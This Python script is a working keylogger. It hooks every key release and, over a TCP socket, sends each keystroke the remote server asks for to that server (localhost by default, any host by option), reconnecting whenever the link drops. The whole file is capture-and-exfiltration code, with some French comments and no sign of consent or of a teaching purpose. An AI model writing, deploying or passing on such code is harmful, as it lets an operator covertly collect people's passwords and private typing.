import keyboard # for keylogs
from threading import Timer
from datetime import datetime
import socket
from optparse import OptionParser
import sys, re,time
from threading import Timer, Thread

# thread to send a command to server
class ServerSendThread(Thread):
    def __init__(self, socket, message):
        Thread.__init__(self)
        self.socket = socket
        self.message = message

    def run(self):
        self.socket.send(self.message.encode())


class Keylogger:
    def __init__(self, serverip,  port):
        self.serverip = serverip
        self.port = port
        self.tabAuthorizedChars = []
        self.runThreadClient = True
        
    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        m = str(event.name)
        if m in  self.tabAuthorizedChars:
            #print('envoi %c via socket' % event.name)
            newthread = ServerSendThread(self.socket, m)
            newthread.start()
        
    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
        
    # process message
    def processMessage(self, message):
        print('received message: %s len=%d' % (message, len(message)))
        self.tabAuthorizedChars = message.split()
        print(self.tabAuthorizedChars)
        
    # thread procedure to handle server connections/messages
    def serverConnexionThread(self):
        while self.runThreadClient == True:
            print("Trying to connect to server %s on port %s " % (self.serverip, self.port))
            try:
                # opening socket on port
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.serverip, int(self.port)))
                print("server %s connected on port %s " % (self.serverip, self.port))
                # Loop until users quits with CTRL-C
                while True:
                    try:
                        # test if client still connected
                        message =  self.socket.recv(4096).decode()
                        if not message:
                                print('serverConnexionThread : server %s deconnexion !' % self.serverip)
                                break
                        else:
                            self.processMessage(message)
                    except socket.error:
                        # fin du thread
                        print("serverConnexionThread : server %s deconnexion !" % self.serverip)
                        break
            except socket.error:
                # fin du thread
                print("clientConnexionThread : server %s no socket !" % self.serverip)
            time.sleep(1)


if __name__ == "__main__":
    # parse args   
    usage = 'python3 %s [-s|--server <server>, localhost default   -p||--port <port>, 1550 default, must be in [100, 9999]]' % (sys.argv[0])
    # options parser
    parser = OptionParser(usage)
    parser.add_option("-s", "--server",
                      action="store", type="string", dest="server",
                      help = 'server name or ip, localhost default')
    parser.add_option("-p", "--port",
                      action="store", type="string", dest="port",
                      help = 'port, 1550 default, must be in[100, 9999]')
    # get options
    (options, args) = parser.parse_args()
    # check options
    if options.server == None:
        print('applying default localhost as server')
        server = 'localhost'
    else:
        try:
            server  = socket.gethostbyname(options.server)
        except socket.gaierror:
            print('server name or ip invalid: %s' % options.server)
            sys.exit(2)
        
    if options.port == None:
        print('applying default port as 1550')
        port = 1550
    else:        
        if not options.port.isdigit() or not int(options.port) in range(100, 10000):
            print('port %s in not valid' % options.port)
            sys.exit(2)
        port = int(options.port)
        
    
    # if you want a keylogger to send to socket
    keylogger = Keylogger(server, port)
    runThread = True
    Thread(target = keylogger.serverConnexionThread, daemon = True).start()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print(sys.argv[0] + " : arret par CTRL+C\n")
        keylogger.runThreadClient = False
